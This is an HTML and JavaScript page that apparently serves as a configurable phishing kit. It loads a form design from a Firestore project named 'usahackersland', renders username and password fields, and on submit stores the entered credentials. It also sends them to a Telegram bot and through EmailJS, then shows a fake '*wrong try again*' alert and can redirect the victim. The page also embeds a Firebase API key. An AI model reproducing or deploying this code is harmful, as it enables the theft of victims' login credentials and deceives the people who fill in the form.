<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Dynamic Form</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px}
.wrap{max-width:800px;margin:auto;background:#fff;padding:18px;border-radius:10px}
input,textarea,select,button{width:100%;padding:8px;margin-top:6px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
textarea{min-height:70px}
.draggableBtn{position:absolute;cursor:move;color:#fff;border:none;border-radius:8px}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
</style>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
<div class="wrap" id="formWrap"></div>

<script>
// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// EmailJS init
emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS User ID

// Telegram config
const BOT_TOKEN = "YOUR_BOT_TOKEN";  // Replace with your Telegram bot token
const CHAT_ID = "YOUR_CHAT_ID";      // Replace with your Telegram chat ID

function getQueryParam(name) {
  return new URLSearchParams(window.location.search).get(name);
}

function sendTelegram(username, password, extraFields){
  let message = `üìå New Form Submission\nUsername: ${username || "‚Äî"}\nPassword: ${password || "‚Äî"}\n`;
  if(extraFields.length) message += `Extras: ${extraFields.join(", ")}\n`;
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({chat_id: CHAT_ID, text: message})
  }).catch(err=>console.error("Telegram error:", err));
}

function sendEmail(username, password, extraFields){
  const templateParams = {
    username: username || "‚Äî",
    password: password || "‚Äî",
    extras: extraFields.join(", ")
  };
  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",templateParams)
    .then(res=>console.log("Email sent"))
    .catch(err=>console.error("Email error:", err));
}

function renderForm(data){
  const wrap = document.getElementById("formWrap");
  wrap.innerHTML="";
  wrap.style.background = data.bgColor || "#fff";
  if(data.bgImageURL){
    wrap.style.backgroundImage = `url(${data.bgImageURL})`;
    wrap.style.backgroundSize = data.bgSize || "cover";
  }

  if(data.avatarURL) wrap.innerHTML+=`<img src="${data.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
  if(data.logoURL) wrap.innerHTML+=`<img src="${data.logoURL}" style="width:140px;display:block;margin:auto">`;

  wrap.innerHTML+=`<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
  wrap.innerHTML+=`<p style="text-align:center;color:${data.subtitleColor}">${data.subtitle}</p>`;
  wrap.innerHTML+=`<p>${data.description}</p>`;
  if(data.enableWarning && data.warningPosition!=="none"){
    wrap.innerHTML+=`<p style="color:#b71c1c;text-align:${data.warningPosition}">${data.warning}</p>`;
  }

  const formDiv = document.createElement("div");
  formDiv.style.display = "flex";
  formDiv.style.flexDirection = "column";
  formDiv.style.alignItems = data.btnPosition==="left"?"flex-start":data.btnPosition==="right"?"flex-end":"center";
  formDiv.style.gap="8px";

  if(data.addAuth){
    formDiv.innerHTML+=`<input placeholder="${data.usernamePlaceholder}">`;
    formDiv.innerHTML+=`<input type="password" placeholder="${data.passwordPlaceholder}">`;
  }

  if(data.extraFields && data.extraFields.length){
    data.extraFields.forEach(v=>{ if(v.trim()) formDiv.innerHTML+=`<input placeholder="${v.trim()}">`; });
  }

  // Embed Links
  if(data.embedLinks){
    data.embedLinks.forEach(link=>{
      if(!link.show) return;
      const div = document.createElement("div");
      div.className="embedLink";
      div.innerHTML = `<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
      if(link.desc) div.innerHTML+=`<br><small>${link.desc}</small>`;
      formDiv.appendChild(div);
    });
  }

  // Main Button
  if(data.showMainBtn){
    const mainBtn = document.createElement("button");
    mainBtn.style.background = data.btnColor||"#1976d2";
    mainBtn.style.color = "#fff";
    mainBtn.style.padding = "10px";
    mainBtn.style.border = "none";
    mainBtn.style.borderRadius = "8px";
    mainBtn.textContent = data.buttonText||"Submit";

    mainBtn.onclick = () => {
      const inputs = formDiv.querySelectorAll("input");
      let username = "", password = "", extraFields = [];

      inputs.forEach((inp,i)=>{
        if(data.addAuth && i===0) username=inp.value;
        else if(data.addAuth && i===1) password=inp.value;
        else extraFields.push(inp.value);
      });

      // Save to Firestore
      db.collection("submissions").add({
        username: username,
        password: password,
        extraFields: extraFields,
        createdAt: new Date().toISOString()
      }).then(()=>{
        alert("*wrong try again*"); // message
        sendTelegram(username, password, extraFields); // Telegram
        sendEmail(username, password, extraFields);     // Email
        if(data.enableRedirect && data.redirectURL) window.location.href=data.redirectURL;
      }).catch(err=>{
        console.error(err);
        alert("‚ùå Error submitting form.");
      });
    };

    formDiv.appendChild(mainBtn);
  }

  wrap.appendChild(formDiv);

  // Footer
  wrap.innerHTML += `<footer style="text-align:center;margin-top:10px;font-size:12px">${data.footerText||""}</footer>`;
}

const formId = getQueryParam("id");
if(formId){
  db.collection("forms").doc(formId).get().then(doc=>{
    if(doc.exists) renderForm(doc.data());
    else document.getElementById("formWrap").textContent="Form not found!";
  }).catch(err=>{
    console.error(err);
    document.getElementById("formWrap").textContent="Error loading form.";
  });
} else {
  document.getElementById("formWrap").textContent="No form ID provided.";
}
</script>
</body>
</html>
